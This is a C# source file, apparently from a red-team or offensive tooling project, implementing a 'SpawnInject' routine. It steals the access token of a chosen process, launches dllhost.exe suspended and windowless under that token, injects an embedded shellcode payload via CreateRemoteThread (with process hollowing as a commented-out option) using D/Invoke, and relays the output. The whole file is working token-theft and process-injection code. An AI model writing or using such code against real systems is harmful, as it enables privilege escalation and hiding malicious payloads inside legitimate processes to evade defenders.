using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WinAPI.Wrapper;

namespace Win32Test
{
    internal class SpawnInject
    {
        public static void Run(string[] args)
        {
            //var apitype = APIAccessType.PInvoke;
            var injectMethod = InjectionMethod.CreateRemoteThread;

            var apitype = APIAccessType.DInvoke;
            //var injectMethod = InjectionMethod.ProcessHollowingWithAPC;

            Console.WriteLine($"[?] WinAPIAccess = {apitype}");
            Console.WriteLine($"[?] InjectMethod = {injectMethod}");

            string cmd = @"c:\windows\system32\dllhost.exe";
            byte[] shellcode = Properties.Resources.Payload;

            int? processId = null;

            if (args.Length == 1)
            {
                if (!int.TryParse(args[0], out var pId))
                    throw new ArgumentException("Process is not valid!");
                processId = pId;
            }

            var wrapper = PInvokeAPIWrapper.CreateInstance(apitype);

            IntPtr hToken = IntPtr.Zero;

            //steal the token
            if (processId.HasValue)
            {
                Console.WriteLine($"[>] Stealing Token from process {processId}...");
                hToken = wrapper.StealToken(processId.Value);
                Console.WriteLine($"[?] TokenHandle = {hToken}");
            }

            var creationParms = new ProcessCreationParameters()
            {
                Application = cmd,
                Token = hToken,
                RedirectOutput = true,
                CreateNoWindow = true,
                CreateSuspended = true,
            };

            Console.WriteLine($"[>] Executing {cmd}...");
            var procResult = wrapper.CreateProcess(creationParms);

            Console.WriteLine($"[?] ProcessId = {procResult.ProcessId}");
            Console.WriteLine($"[?] ProcessHandle = {procResult.ProcessHandle}");
            Console.WriteLine($"[?] PipeHandle = {procResult.OutPipeHandle}");

            wrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode, injectMethod);

            if (procResult.ProcessId != 0 && creationParms.RedirectOutput)
            {
                Console.WriteLine("[+] Result :");
                wrapper.ReadPipeToEnd(procResult.ProcessId, procResult.OutPipeHandle, output => Console.Write(output));
            }
        }
    }
}
